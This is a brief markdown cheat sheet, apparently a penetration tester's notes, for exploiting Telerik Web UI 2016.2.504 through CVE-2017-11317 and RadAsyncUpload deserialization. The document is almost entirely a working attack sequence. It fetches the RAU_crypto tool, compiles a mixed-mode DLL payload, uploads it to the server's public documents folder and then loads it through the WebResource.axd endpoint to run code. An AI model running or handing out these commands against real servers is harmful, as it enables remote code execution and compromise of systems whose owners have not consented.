# Telerik Web UI Unrestricted File Upload (CVE-2017-11317) + Telerik Web UI RadAsyncUpload Deserialization 

## Telerik version: 2016.2.504

## Target
https://target

## Proxy
http://127.0.0.1:8080

## Command
[https://github.com/bao7uo/MixedUp](https://github.com/bao7uo/MixedUp)
```
curl -OL https://github.com/bao7uo/RAU_crypto/blob/master/RAU_crypto.py

"C:\Program Files (x86)\Microsoft Visual Studio\2019\BuildTools\VC\Tools\MSVC\14.29.30133\bin\Hostx64\x64\cl.exe" /clr /LD MixedAssembly.cpp -o MixedAssembly64.dll
"C:\Program Files (x86)\Microsoft Visual Studio\2019\BuildTools\VC\Tools\MSVC\14.29.30133\bin\Hostx64\x64\cl.exe" /clr load.cpp

python RAU_crypto.py -P c:/users/public/documents/ 2016.2.504 MixedAssembly64.dll https://target/Telerik.Web.UI.WebResource.axd?type=rau http://127.0.0.1:8080

python RAU_crypto.py -L c:/users/public/documents/MixedAssembly64.dll https://target/Telerik.Web.UI.WebResource.axd?type=rau http://127.0.0.1:8080

python RAU_crypto.py -P c:/users/public/documents/ 2016.2.504 MixedAssembly32.dll https://target/Telerik.Web.UI.WebResource.axd?type=rau http://127.0.0.1:8080

python RAU_crypto.py -L c:/users/public/documents/MixedAssembly32.dll https://target/Telerik.Web.UI.WebResource.axd?type=rau http://127.0.0.1:8080
```
